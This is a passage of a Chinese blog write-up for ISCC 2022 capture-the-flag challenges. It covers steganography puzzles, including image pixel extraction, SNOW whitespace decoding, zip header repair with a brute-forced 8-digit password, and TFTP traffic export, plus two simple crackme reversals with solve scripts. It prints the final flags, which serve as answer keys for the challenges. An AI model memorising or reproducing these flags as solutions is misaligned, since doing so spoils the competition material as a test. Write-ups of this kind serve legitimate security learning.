class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-number">1</span>：FLAG<span class="hljs-operator">=</span><br><span class="hljs-number">2</span>：ISCC&#123;<br><span class="hljs-number">3</span>：TCQIU<br><span class="hljs-number">4</span>：WVLVH<br><span class="hljs-number">5</span>：LZDF&#125;<br></code></pre></td></tr></table></figure><h2 id="降维打击"><a class="markdownIt-Anchor" href="#降维打击"></a> 降维打击</h2><p>这题写的我真的是很难受。最后一部分整了半天。</p><p>flag格式：ISCC{xxxx-xxxx-xxxx}</p><p>首先下载附件，解压得到一个图片。</p><p><img src="https://s2.loli.net/2022/05/02/pbCsNHajOFcqfyY.png" alt="misc-DimensionalityReductionStrike-19" /></p><p>啊，是伊雷娜。</p><p>用binwalk看看有没有文件。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">└─$ binwalk misc-DimensionalityReductionStrike-19.png <br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             PNG image, 1192 x 1656, 8-bit colormap, non-interlaced<br>882           0x372           Zlib compressed data, best compression<br>290500        0x46EC4         PNG image, 200 x 400, 8-bit/color RGB, non-interlaced<br>290541        0x46EED         Zlib compressed data, default compression<br></code></pre></td></tr></table></figure><p>可以看到这里是有东西的。有一个200*400大小的图像文件。但是binwalk提不出来…所以就换foremost来提了。</p><p><img src="https://s2.loli.net/2022/05/02/sulnctUJ14kD2O5.png" alt="00000567" /></p><p>可以看到提出来的图片是这样的。算是二值图像了。结合题目降维打击，应该是要我把这个图像展开为一维了。按行展开肯定不行，因为有一半都是纯黑色，提取出来的数据没有关联。稍微看了下列展开的结果。如果把像素值255表示为1的话。前面几个像素点的转换结果刚好是8950。这是PNG文件的文件头。看来方向对了。</p><p>写个脚本提一下数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># extract.py</span><br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><span class="hljs-keyword">from</span> libnum <span class="hljs-keyword">import</span> b2s<br><br>img = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;00000567.png&quot;</span>)<br><br>weight, height = img.size<br>img_gray = img.convert(<span class="hljs-string">&quot;L&quot;</span>)<br><br>bin_data = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(weight):<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(height):<br>        <span class="hljs-keyword">if</span> img_gray.getpixel((i,j)) == <span class="hljs-number">255</span>:<br>            bin_data.append(<span class="hljs-string">&quot;1&quot;</span>)<br>        <span class="hljs-keyword">else</span> :<br>            bin_data.append(<span class="hljs-string">&quot;0&quot;</span>)<br><br>data = <span class="hljs-string">&quot;&quot;</span>.join(bin_data)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&quot;data.png&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> fp:<br>    fp.write(b2s(data))<br></code></pre></td></tr></table></figure><p>提取出来的数据可以作为图像阅读。</p><p><img src="https://s2.loli.net/2022/05/02/e6OXdwMmx1U58Q9.png" alt="data" /></p><p>到这里看的我一头雾水。这是什么图像密码。我都没见过，找了一圈图形密码，就是没找到和这个类似的。</p><p>想起原图是伊雷娜的图，不会是魔女之旅里面的文字吧？</p><p>百度了一下没想带还真有…</p><p><a href="https://www.bilibili.com/video/BV1Gq4y1g7yw?spm_id_from=333.999.0.0">https://www.bilibili.com/video/BV1Gq4y1g7yw?spm_id_from=333.999.0.0</a></p><p><img src="https://s2.loli.net/2022/05/02/N4TitScG2dek19V.png" alt="image-20220502221726137" /></p><p>然后我就遇到了这道题最大的难点（对我来说）。我找不到对应的字母。或者说找到的都不对。能确定的是C、K、I(i)、U和N。其他的不知道对应哪一个。</p><p>后面又找了一个：<a href="https://www.bilibili.com/read/cv8724055/">https://www.bilibili.com/read/cv8724055/</a></p><p>得到答案为：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs">fckziuurqknf或者fckziuurpknf<br>zckfiuurqknz或者zckfiuurpknz<br></code></pre></td></tr></table></figure><p>然后按照格式提交上去不对…我很想直到出题人是怎么写的这几个字…</p><p>最后尝试了这个</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">ISCC</span><span class="hljs-template-variable">&#123;FCKZ-IUUR-PKNF&#125;</span><br></code></pre></td></tr></table></figure><p>结果过了。</p><p>…</p><p>让我们回到题目的flag格式：</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">flag格式：ISCC</span><span class="hljs-template-variable">&#123;xxxx-xxxx-xxxx&#125;</span><br></code></pre></td></tr></table></figure><p>作者你这不是坑爹吗。</p><h2 id="2022冬奥会"><a class="markdownIt-Anchor" href="#2022冬奥会"></a> 2022冬奥会</h2><div class="note note-info">            <p>于2022-05-11新增</p>          </div><p>与单板小将苏翊鸣题解一致。修改图片高度。得到信息：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-symbol">&amp;#x51b0;</span><span class="hljs-symbol">&amp;#x58a9;</span><span class="hljs-symbol">&amp;#x58a9;</span><span class="hljs-symbol">&amp;#x7684;</span><span class="hljs-symbol">&amp;#x5c0f;</span><span class="hljs-symbol">&amp;#x4f19;</span><span class="hljs-symbol">&amp;#x4f34;</span><span class="hljs-symbol">&amp;#x7ecf;</span><span class="hljs-symbol">&amp;#x5e38;</span><span class="hljs-symbol">&amp;#x88ab;</span><span class="hljs-symbol">&amp;#x4eba;</span><span class="hljs-symbol">&amp;#x51b7;</span><span class="hljs-symbol">&amp;#x843d;</span><span class="hljs-symbol">&amp;#xff0c;</span><span class="hljs-symbol">&amp;#x4f60;</span><span class="hljs-symbol">&amp;#x77e5;</span><span class="hljs-symbol">&amp;#x9053;</span><span class="hljs-symbol">&amp;#x5b83;</span><span class="hljs-symbol">&amp;#x7684;</span><span class="hljs-symbol">&amp;#x539f;</span><span class="hljs-symbol">&amp;#x578b;</span><span class="hljs-symbol">&amp;#x662f;</span><span class="hljs-symbol">&amp;#x4ec0;</span><span class="hljs-symbol">&amp;#x4e48;</span><span class="hljs-symbol">&amp;#x5417;</span><span class="hljs-symbol">&amp;#xff1f;</span><br></code></pre></td></tr></table></figure><p>unicode编码，问的是雪容融的原型是什么。答案是灯笼。</p><h2 id="真相只有一个"><a class="markdownIt-Anchor" href="#真相只有一个"></a> 真相只有一个</h2><div class="note note-info">            <p>于2022-05-12新增</p>          </div><p>下载文件。里面有一张图片，一个文本，一个未知文件。</p><p>文本里面包含了很多的空白字符，空格制表符啥的。应该是snow隐写。试了一下直接用snow提取：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs powershell">F:\CTFTools\隐写\SNOW&gt;SNOW.EXE <span class="hljs-literal">-C</span> F:\Download\CTF\ISCC2022\真相只有一个\flag.txt<br><span class="hljs-built_in">h</span><br> bn1aagwanter <span class="hljs-built_in">h</span>:lwse<br></code></pre></td></tr></table></figure><p>看样子不是什么有用的东西。应该是要密码。</p><p>图片打开的时候报了一个CRC错误的警告。这个应该是图像的宽度或者高度被修改了才会出现的。但是原图像没有失真扭曲，所以应该是高度被修改了。把高度改大一点，左下角出现了摩斯密码。翻译一下。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">-.<span class="hljs-regexp">/---/</span>-<span class="hljs-regexp">/..../</span>.<span class="hljs-regexp">/.-./</span>.<br>nothere<br></code></pre></td></tr></table></figure><p>嗯…这个可能是密码，但也不一定，尝试用这个密码解snow。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">F:\CTFTools\隐写\SNOW&gt;SNOW.EXE <span class="hljs-literal">-C</span> <span class="hljs-literal">-p</span> nothere F:\Download\CTF\ISCC2022\真相只有一个\flag.txt<br>y .bpti   awds1)n.. n  aWarning: residual of <span class="hljs-number">5</span> bits not uncompressed<br></code></pre></td></tr></table></figure><p>失败了，看来这个应该就是提示你flag不在这。</p><p>那么现在就剩下一个文件了。这个文件不知道是什么类型的。先用二进制看看。</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tap">00<span class="hljs-number"> 00 </span>03<span class="hljs-number"> 04 </span>14<span class="hljs-number"> 00 </span>01<span class="hljs-number"> 00 </span>08<span class="hljs-number"> 00 </span>08 8B<span class="hljs-number"> 49 </span>54<span class="hljs-number"> 87 </span>DA �����‹IT‡Ú<br>DD<span class="hljs-number"> 97 </span>95 D2<span class="hljs-number"> 22 </span>00<span class="hljs-number"> 88 </span>D3 2C<span class="hljs-number"> 00 </span>0D<span class="hljs-number"> 00 </span>00<span class="hljs-number"> 00 </span>73 74Ý—•Ò&quot;�ˆÓ,� ���st<br>72<span class="hljs-number"> 65 </span>61 6D 2E<span class="hljs-number"> 70 </span>63<span class="hljs-number"> 61 </span>70 6E<span class="hljs-number"> 67 </span>4F<span class="hljs-number"> 15 </span>F0<span class="hljs-number"> 01 </span>EFream.pcapngOðï<br></code></pre></td></tr></table></figure><p>可以看到有个流量包。而且看文件开头的那些数据。14 00 01 00 如果经常做压缩包相关的题的，这个是加密压缩包会出现的特征。所以判断这是一个压缩包，但是缺少了头。所以我们补上即可。修复完之后，再看压缩包内文件PK头部分，也有加密特征，说明这个应该是真加密，我们需要找到对应的密码。</p><p>翻了一圈在图像里面找到了。</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">706173737764efbc 9a313939382f7878  passwd.. <span class="hljs-string">.1998/xx</span><br>2f78782492492492 4924924924924920  <span class="hljs-string">/xx</span>$<span class="hljs-string">.I</span>$. I$<span class="hljs-string">.I</span>$<span class="hljs-string">.I</span> <br>248eda97b24fc049 53b6b6db6db6db6d  $<span class="hljs-string">....O.I</span> S.<span class="hljs-string">..m..m</span><br></code></pre></td></tr></table></figure><p>LSB提一下，看到有个passwd，后面是个日期。这个提示我们密码是个8位数字。所以直接爆破。得到密码19981111。</p><p>解压后得到一个包文件。用wireshark打开看看。可以看到几乎全部是TFTP报文，说明这个里面有个传输的文件。TFTP是不加密的，所以我们直接将文件提取出来。</p><p>菜单选择“文件”，“导出对象”，“TFTP”。可以看到有个password.mp3的文件。选中保存。</p><p>将这个mp3文件放入Audacity。</p><p><img src="https://s2.loli.net/2022/05/12/qKaNGjLQhrtc1Ck.jpg" alt="password" /></p><p>可以看到后方有不规则的波形。是摩斯电码。解密得到isccmisc。这个文件的名字就叫password。所以这个结果应该就是snow的密码。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs powershell">F:\CTFTools\隐写\SNOW&gt;SNOW.EXE <span class="hljs-literal">-C</span> <span class="hljs-literal">-p</span> isccmisc F:\Download\CTF\ISCC2022\真相只有一个\flag.txt<br><span class="hljs-number">94</span>jN<span class="hljs-literal">-itGW-A9OH</span><br></code></pre></td></tr></table></figure><p>得到flag。</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ISCC&#123;<span class="hljs-number">94</span>jN<span class="hljs-literal">-itGW-A9OH</span>&#125;<br></code></pre></td></tr></table></figure><h1 id="reverse"><a class="markdownIt-Anchor" href="#reverse"></a> Reverse</h1><h2 id="amys-code"><a class="markdownIt-Anchor" href="#amys-code"></a> Amy’s Code</h2><p>逆向还没入门，所以挑了简单的题练手。哎，没有师傅带自己学是真的进展缓慢。</p><p>文件下载下来，StuPE看一下是32位程序。</p><p>运行一下。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">Please input flag：wafsafwfaw<br>Wrong!<br></code></pre></td></tr></table></figure><p>看样子是我要自己逆向出flag了。</p><p>IDA打开看看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main_0</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  <span class="hljs-type">char</span> Destination[<span class="hljs-number">520</span>]; <span class="hljs-comment">// [esp+DCh] [ebp-410h] BYREF</span><br>  <span class="hljs-type">char</span> Source[<span class="hljs-number">516</span>]; <span class="hljs-comment">// [esp+2E4h] [ebp-208h] BYREF</span><br><br>  j__printf(aPleaseInputFla);<br>  sub_411717((va_list)<span class="hljs-string">&quot;%s&quot;</span>, (<span class="hljs-type">char</span>)Source);<br>  j__strcpy(Destination, Source);<br>  sub_4115FF(Destination);<br>  <span class="hljs-keyword">if</span> ( sub_411433(Destination) )<br>    j__printf(<span class="hljs-string">&quot;Correct!\n&quot;</span>);<br>  <span class="hljs-keyword">else</span><br>    j__printf(<span class="hljs-string">&quot;Wrong!\n&quot;</span>);<br>  j__system(<span class="hljs-string">&quot;pause&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>流程很简单。</p><p>首先读入，然后进入sub_4115FF这个函数处理一下输入的字符串。然后使用sub_411433函数进行判断。重点应该就是这两个函数了。</p><p>先进入sub_4115FF这个函数看看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// attributes: thunk</span><br><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_4115FF</span><span class="hljs-params">(<span class="hljs-type">char</span> *Str)</span><br>&#123;<br>  <span class="hljs-keyword">return</span> sub_4128A0(Str);<br>&#125;<br></code></pre></td></tr></table></figure><p>跳转到新函数sub_4128A0。跟进。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_4128A0</span><span class="hljs-params">(<span class="hljs-type">char</span> *Str)</span><br>&#123;<br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+D0h] [ebp-14h]</span><br>  <span class="hljs-type">signed</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [esp+DCh] [ebp-8h]</span><br><br>  v3 = j__strlen(Str);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; ; ++i )<br>  &#123;<br>    result = i;<br>    <span class="hljs-keyword">if</span> ( i &gt;= v3 )<br>      <span class="hljs-keyword">break</span>;<br>    Str[i] ^= i;<br>  &#125;<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个函数逻辑还是很好理解的。就是把对应字符串的字符异或上他的索引值。</p><p>在到sub_411433函数看看。其跳转到sub_412550了，我们也跟进。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_412550</span><span class="hljs-params">(<span class="hljs-type">char</span> *Str)</span><br>&#123;<br>  <span class="hljs-type">int</span> j; <span class="hljs-comment">// [esp+D0h] [ebp-14Ch]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [esp+DCh] [ebp-140h]</span><br>  <span class="hljs-type">int</span> v4[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [esp+E8h] [ebp-134h] BYREF</span><br>  <span class="hljs-type">int</span> v5; <span class="hljs-comment">// [esp+168h] [ebp-B4h]</span><br>  <span class="hljs-type">char</span> v6[<span class="hljs-number">24</span>]; <span class="hljs-comment">// [esp+174h] [ebp-A8h] BYREF</span><br>  <span class="hljs-type">int</span> v7; <span class="hljs-comment">// [esp+18Ch] [ebp-90h]</span><br>  __int16 v8; <span class="hljs-comment">// [esp+190h] [ebp-8Ch]</span><br>  <span class="hljs-type">int</span> v9[<span class="hljs-number">31</span>]; <span class="hljs-comment">// [esp+19Ch] [ebp-80h]</span><br><br>  v9[<span class="hljs-number">0</span>] = <span class="hljs-number">149</span>;v9[<span class="hljs-number">1</span>] = <span class="hljs-number">169</span>;v9[<span class="hljs-number">2</span>] = <span class="hljs-number">137</span>;v9[<span class="hljs-number">3</span>] = <span class="hljs-number">134</span>;<br>  v9[<span class="hljs-number">4</span>] = <span class="hljs-number">212</span>;v9[<span class="hljs-number">5</span>] = <span class="hljs-number">188</span>;v9[<span class="hljs-number">6</span>] = <span class="hljs-number">177</span>;v9[<span class="hljs-number">7</span>] = <span class="hljs-number">184</span>;<br>  v9[<span class="hljs-number">8</span>] = <span class="hljs-number">177</span>;v9[<span class="hljs-number">9</span>] = <span class="hljs-number">197</span>;v9[<span class="hljs-number">10</span>] = <span class="hljs-number">192</span>;v9[<span class="hljs-number">11</span>] = <span class="hljs-number">179</span>;<br>  v9[<span class="hljs-number">12</span>] = <span class="hljs-number">153</span>;v9[<span class="hljs-number">13</span>] = <span class="hljs-number">197</span>;v9[<span class="hljs-number">14</span>] = <span class="hljs-number">159</span>;v9[<span class="hljs-number">15</span>] = <span class="hljs-number">163</span>;<br>  v9[<span class="hljs-number">16</span>] = <span class="hljs-number">160</span>;v9[<span class="hljs-number">17</span>] = <span class="hljs-number">167</span>;v9[<span class="hljs-number">18</span>] = <span class="hljs-number">169</span>;v9[<span class="hljs-number">19</span>] = <span class="hljs-number">184</span>;<br>  v9[<span class="hljs-number">20</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">21</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">22</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">23</span>] = <span class="hljs-number">0</span>;<br>  v9[<span class="hljs-number">24</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">25</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">26</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">27</span>] = <span class="hljs-number">0</span>;<br>  v9[<span class="hljs-number">28</span>] = <span class="hljs-number">0</span>;v9[<span class="hljs-number">29</span>] = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">strcpy</span>(v6, <span class="hljs-string">&quot;LWHFUENGDJGEFHYDHIGJ&quot;</span>);<span class="hljs-comment">//len = 20</span><br>  v7 = <span class="hljs-number">0</span>;<br>  v8 = <span class="hljs-number">0</span>;<br>  v5 = j__strlen(Str);<br>  j__memset(v4, <span class="hljs-number">0</span>, <span class="hljs-number">0x78</span>u);<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v5; ++i )<br>    v4[i] = v6[i] + Str[i];<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; j &lt; v5; ++j )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v4[j] != v9[j] )<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来只要逆这个运算过程即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; v5; ++i )<br>    v4[i] = v6[i] + Str[i];<br></code></pre></td></tr></table></figure><p>首先我们来解出Str是什么。看样子str长度应该要为20。由此得到我们这个函数期望输入的字符串。接下来再反向sub_4128A0函数即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># solve.py</span><br><br>v9 = [<br>    <span class="hljs-number">149</span>, <span class="hljs-number">169</span>, <span class="hljs-number">137</span>, <span class="hljs-number">134</span>,<br>    <span class="hljs-number">212</span>, <span class="hljs-number">188</span>, <span class="hljs-number">177</span>, <span class="hljs-number">184</span>,<br>    <span class="hljs-number">177</span>, <span class="hljs-number">197</span>, <span class="hljs-number">192</span>, <span class="hljs-number">179</span>,<br>    <span class="hljs-number">153</span>, <span class="hljs-number">197</span>, <span class="hljs-number">159</span>, <span class="hljs-number">163</span>,<br>    <span class="hljs-number">160</span>, <span class="hljs-number">167</span>, <span class="hljs-number">169</span>, <span class="hljs-number">184</span>,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>,<br>    <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br><br>v6 = <span class="hljs-string">&quot;LWHFUENGDJGEFHYDHIGJ&quot;</span><br><br>inputStr = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(v6)):<br>    inputStr.append(v9[i] - <span class="hljs-built_in">ord</span>(v6[i]))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(inputStr)):<br>    inputStr[i] ^= i<br><br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">chr</span>(x) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> inputStr])<br><br><span class="hljs-comment"># ISCC&#123;reverse_pHPHOp&#125;</span><br></code></pre></td></tr></table></figure><h2 id="getthetable"><a class="markdownIt-Anchor" href="#getthetable"></a> GetTheTable</h2><div class="note note-info">            <p>于2022-05-11新增</p>          </div><p>下载附件IDA打开。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c">n1 = <span class="hljs-number">18</span>;<br>  <span class="hljs-built_in">strcpy</span>(str, <span class="hljs-string">&quot;ERaQux2uV3u5F736EjkECSDVLp&quot;</span>);<br>  <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%s&quot;</span>, plainText);<br>  n = <span class="hljs-built_in">strlen</span>(plainText);<br>  <span class="hljs-keyword">if</span> ( n &lt;= <span class="hljs-number">32</span> )<br>  &#123;<br>    *(_QWORD *)&amp;len[<span class="hljs-number">4</span>] = <span class="hljs-number">0</span>i64;<br>    *(_QWORD *)len = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(<span class="hljs-number">138</span> * <span class="hljs-built_in">strlen</span>(plainText) / <span class="hljs-number">0x64</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">strcpy</span>(str12581, <span class="hljs-string">&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;</span>);<br>    encryption = (<span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(*(<span class="hljs-type">int</span> *)len);<br>    index = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p>是base58加密。str应该就是我们加密过后的字符串。把字符串拿出来进行base58解密即可得到flag。</p><h1 id="未完成"><a class="markdownIt-Anchor" href="#未完成"></a> 未完成</h1><h2 id="藏在星空中的诗-2"><a class="markdownIt-Anchor" href="#藏在星空中的诗-2"></a> 藏在星空中的诗-2</h2><div class="note note-info">            <p>于2022-05-12新增</p>          </div><p>下载附件，里面就一个文本文件。</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\🌟🌠🌠✴🟉\🌟🌠🌠★⍣\🌟🌠🌠✴⍣\🌟🌠🌠✴⍣\🌟🌠🌠✧≛\🌟🌠🌠✧🟉\🌟🌠🌠✴🟉\🌟🌠🌠✴🟌\🌟🌠🌠✧✧\🌟🌠🌠✲≛\🌟🌠🌠☆🟌\🌟🌠🌠✧✡\🌟🌠🌠☆🟌\🌟🌠🌠★✧\🌟🌠🌠⍣✸\🌟🌠🌠✴⍣\🌟🌠🌠✧🟉\🌟🌠🌠✴✡\🌟🌠🌠★★\🌟🌠🌠✧⚝</span><br></code></pre></td></tr></table></figure><p>可以看到有个斜杠。这个应该是unicode。Unicode有好几种分隔符，使用\开头的有\u和\u+，这个看样子是\u。所以🌟可以替换位u。观察到每个unicode前面都有🌠🌠，而英文字符的unicode前面都是00。猜测这个替换了00，所以将其替换回去。</p><p>这里猜测前五个字符是“ISCC{”而最后一个字符是&quot;}&quot;。可以得到对应的Unicode编码。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript">ISCC&#123;<br><span class="hljs-symbol">\u0049</span><span class="hljs-symbol">\u0053</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u007b</span><br>&#125;<br><span class="hljs-symbol">\u007d</span><br></code></pre></td></tr></table></figure><p>可以发现前面其实可以对上的。你看文件中第三个和第四个编码，是一样的。很有可能就是我们猜测的样子。得到编码后对应替换。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs taggerscript"><span class="hljs-symbol">\u0049</span><span class="hljs-symbol">\u0053</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u007b</span><span class="hljs-symbol">\u0079</span><span class="hljs-symbol">\u0049</span>\u004🟌<span class="hljs-symbol">\u0077</span>\u00✲b\u00☆🟌\u007✡\u00☆🟌<span class="hljs-symbol">\u0057</span>\u003✸<span class="hljs-symbol">\u0043</span><span class="hljs-symbol">\u0079</span>\u004✡<span class="hljs-symbol">\u0055</span><span 